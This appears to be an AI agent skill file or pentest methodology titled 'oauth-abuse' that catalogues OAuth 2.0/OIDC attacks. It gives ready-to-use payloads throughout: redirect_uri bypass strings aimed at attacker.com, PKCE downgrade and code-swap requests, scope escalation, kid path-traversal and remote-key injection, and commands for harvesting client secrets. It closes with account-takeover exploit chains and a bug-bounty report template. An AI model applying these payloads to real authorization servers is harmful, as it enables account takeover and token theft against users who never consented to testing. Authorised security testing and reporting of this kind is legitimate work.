---
name: oauth-abuse
description: OAuth 2.0 / OIDC attack methodology — redirect_uri bypass, state parameter manipulation, PKCE bypass, CSRF, token theft, scope escalation.
---

# OAuth 2.0 / OIDC Attack Methodology

## Redirect URI Bypass

### Open Redirect Chaining
```bash
# Target OAuth endpoint with open redirect
GET /oauth/authorize?client_id=VICTIM_APP&redirect_uri=https://attacker.com/@victim.com&response_type=code&scope=openid
# If open redirect exists on victim.com → attacker steals code via Referer header
```

### Path Traversal in redirect_uri
```bash
# Path traversal bypasses
redirect_uri=https://victim.com/../../attacker.com
redirect_uri=https://victim.com/../attacker.com
redirect_uri=https://victim.com/%2e%2e%2fattacker.com
redirect_uri=https://victim.com/..%2fattacker.com
# Double encoding
redirect_uri=https://victim.com/%252e%252e%252fattacker.com
```

### Wildcard Bypass (*.domain.com)
```bash
# If allowed: *.victim.com
redirect_uri=https://attacker.victim.com/callback
redirect_uri=https://evil.victim.com.attacker.com/callback
# Subdomain takeover + OAuth = full bypass
```

### URL Parser Differential
```bash
# Exploit parser differences between auth server and client
# Auth server: https://victim.com.attacker.com/
# Client sees: https://victim.com (validates against allowlist)
# Actual redirect goes to attacker.com

# Path confusion
redirect_uri=https://victim.com/attacker.com
redirect_uri=https://victim.com@attacker.com/
redirect_uri=https://victim.com:80@attacker.com/
```

## State Parameter Manipulation

### Missing State → CSRF
```bash
# Attacker initiates OAuth flow for victim
# Victim clicks: https://auth.victim.com/authorize?client_id=APP&redirect_uri=https://attacker.com/callback&response_type=code
# Victim authenticates → redirected to attacker.com with code
# Attacker exchanges code for token → ATO
```

### Weak/Predictable State
```bash
# State = timestamp, short random, static
state=123456
state=abcdef
state=$(date +%s)
# Brute force or predict → CSRF
```

### State Reuse
```bash
# If state not tied to session/user
# Attacker captures valid state from their flow
# Uses same state for victim's flow
```

## PKCE Bypass

### Downgrade Attack (Remove code_challenge)
```bash
# Legitimate request:
GET /authorize?client_id=APP&redirect_uri=URI&code_challenge=S256_HASH&code_challenge_method=S256

# Attacker removes PKCE params:
GET /authorize?client_id=APP&redirect_uri=URI&response_type=code
# If server accepts → no PKCE verification on token exchange
```

### S256 → Plain Downgrade
```bash
# Change method to plain
code_challenge_method=plain
code_challenge=ACTUAL_CODE_VERIFIER
# Server may accept plain when S256 expected
```

### Missing code_verifier Validation
```bash
# Token exchange without code_verifier
POST /token
code=AUTH_CODE&client_id=APP&redirect_uri=URI
# No code_verifier → PKCE bypassed
```

## Authorization Code Interception

### OAuth Code Swap
```bash
# Attacker starts flow, gets code
# Sends victim: https://app.com/callback?code=ATTACKER_CODE
# Victim logs in → attacker's code bound to victim's session
# Attacker uses code → accesses victim's account
```

### Code Reuse
```bash
# If authorization code reusable (no single-use enforcement)
# Attacker captures code via referrer/logs
# Reuses code at token endpoint
```

### Code Leakage via Referrer
```bash
# Redirect URI loads external resources
# Code leaked in Referer header to third parties
# Or via browser history, proxy logs
```

## Implicit Grant Token Theft

### Fragment Access Token
```bash
# Implicit flow: token in URL fragment
https://app.com/callback#access_token=TOKEN&token_type=Bearer&expires_in=3600
# Accessible via:
# - document.location.hash (XSS)
# - Referer header when loading external resources
# - Browser history
```

### Token in Referrer Header
```bash
# Page loads: <img src="https://attacker.com/track.png">
# Referer: https://app.com/callback#access_token=TOKEN...
```

## Client Secret Exposure

### Hardcoded in Mobile/Web
```bash
# Mobile apps: strings binary
strings app.apk | grep -i "client_secret"
# JavaScript: search bundle
grep -r "client_secret" /js/
```

### Secret Leakage via Errors
```bash
# Verbose error messages
{"error": "invalid_client", "error_description": "Client secret 'abc123' does not match"}
```

## Scope Escalation

### Modify Scope Parameter
```bash
# Request additional scopes
scope=openid%20profile%20email%20admin%20delete_users
# If server doesn't validate against registered scopes
```

### Auth Server vs Resource Server Mismatch
```bash
# Auth server issues token with scope=A
# Resource server accepts scope=B (different validation)
# Attacker requests scope=B directly from auth server
```

## CSRF via OAuth

### No State Parameter
```bash
# Attacker crafts OAuth URL
# Victim clicks while logged into auth provider
# Victim completes flow → attacker gets code/token
```

## Account Takeover via OAuth

### Pre-authenticated OAuth Link
```bash
# Attacker registers malicious app
# Creates OAuth link with attacker's redirect_uri
# Sends to victim: "Sign in with Google"
# Victim completes → attacker gets valid session
```

## Token Storage Issues

### Token in URL
```bash
# Access token in query parameter
GET /api/user?access_token=TOKEN
# Logged in server logs, browser history, referrer
```

### localStorage vs httpOnly Cookies
```bash
# localStorage accessible via XSS
# httpOnly cookies not accessible but CSRF vulnerable
# Check: localStorage.getItem('access_token')
```

## SSRF via OAuth

### Refresh Token Endpoint
```bash
POST /token
grant_type=refresh_token&refresh_token=TOKEN&client_id=APP
# If token endpoint URL user-controlled → SSRF
```

### Token Exchange URL
```bash
# OAuth 2.0 Token Exchange (RFC 8693)
POST /token
grant_type=urn:ietf:params:oauth:grant-type:token-exchange
resource=https://internal-service/
subject_token=TOKEN
# resource parameter → SSRF
```

## JWT in OAuth

### Algorithm Confusion
```bash
# JWT header: {"alg": "HS256", "kid": "key1"}
# Server uses public key to verify HS256 (treats as symmetric)
# Attacker signs with public key
```

### kid Injection
```bash
# If kid used to fetch key from DB/fs
"kid": "../../etc/passwd"
"kid": "http://attacker.com/key"
```

### Audience Mismatch
```bash
# Token issued for aud=app1
# Accepted by app2 (different audience validation)
```

## Social Login Bypass

### Facebook/Google/Apple with Attacker Email
```bash
# If email not verified in OAuth response
# Attacker uses victim's email on attacker's account
# Links victim's OAuth to attacker's account
```

### Apple Sign-In Private Email Relay
```bash
# Apple provides private relay email
# If app doesn't handle properly → account confusion
```

## Cross-Domain OAuth Abuse

### Subdomain OAuth → Main Domain Access
```bash
# OAuth on app.victim.com
# Cookie domain: .victim.com
# Token usable on api.victim.com, admin.victim.com
```

## Tool Methodology

### oauth-fuzz.py
```bash
# Comprehensive OAuth fuzzer
python3 oauth-fuzz.py -u https://auth.victim.com \
  -c CLIENT_ID \
  -r https://attacker.com/callback \
  --test-redirect-uri \
  --test-state \
  --test-pkce \
  --test-scope
```

### Burp OAuth Scanner
```bash
# Burp Suite extension
# Auto-discovers OAuth endpoints
# Tests redirect_uri, state, PKCE, scope
# Generates proof-of-concept requests
```

### Manual Testing Checklist
```bash
# 1. Enumerate all OAuth endpoints
/authorize, /token, /userinfo, /revoke, /introspect, /jwks, /.well-known/openid-configuration

# 2. Test each redirect_uri bypass technique
# 3. Verify state parameter implementation
# 4. Test PKCE downgrade/removal
# 5. Check code reuse/single-use
# 6. Test implicit flow fragment leakage
# 7. Search for client_secret in client-side code
# 8. Test scope escalation
# 9. Verify token storage security
# 10. Check for SSRF in token endpoints
# 11. Analyze JWT validation
# 12. Test social login account linking
# 13. Check cross-subdomain token validity
```

## Exploit Chain Examples

### Chain: Redirect URI Bypass + Code Swap → ATO
```bash
# 1. Bypass redirect_uri to attacker.com
# 2. Capture authorization code
# 3. Send victim link with attacker's code
# 4. Victim completes login → attacker's code bound to victim session
# 5. Attacker exchanges code → victim's tokens
```

### Chain: PKCE Bypass + Code Leakage → Token Theft
```bash
# 1. Remove PKCE params → server accepts
# 2. Code leaked via referrer to attacker-controlled resource
# 3. Attacker exchanges code without code_verifier
```

### Chain: Scope Escalation + Missing Audience Check → Privilege Escalation
```bash
# 1. Request admin scope
# 2. Token accepted by admin API (no audience validation)
# 3. Full admin access
```

## Detection & Verification

### Burp Suite Setup
```bash
# Install OAuth extension
# Configure Collaborator for OOB testing
# Set up macro for token exchange
```

### Automated Verification Script
```bash
#!/bin/bash
# verify-oauth.sh
# Tests each vulnerability class and confirms exploitability
```

## Reporting Template

```
Title: OAuth 2.0 Redirect URI Bypass Leading to Account Takeover

Severity: Critical

Impact: Full account takeover of any user via crafted OAuth link

Steps to Reproduce:
1. Visit: https://auth.victim.com/authorize?client_id=APP&redirect_uri=https://attacker.com%2f..%2fvictim.com&response_type=code&scope=openid
2. Authenticate as victim
3. Observe redirect to attacker.com with authorization code
4. Exchange code for access token
5. Access victim's account via API

Evidence:
- HTTP request/response showing code capture
- Token exchange response
- API call returning victim's data
```

## References
- RFC 6749 (OAuth 2.0)
- RFC 7636 (PKCE)
- RFC 8693 (Token Exchange)
- OAuth 2.0 Threat Model (RFC 6819)
- OWASP Authentication Cheat Sheet
- PortSwigger OAuth Research
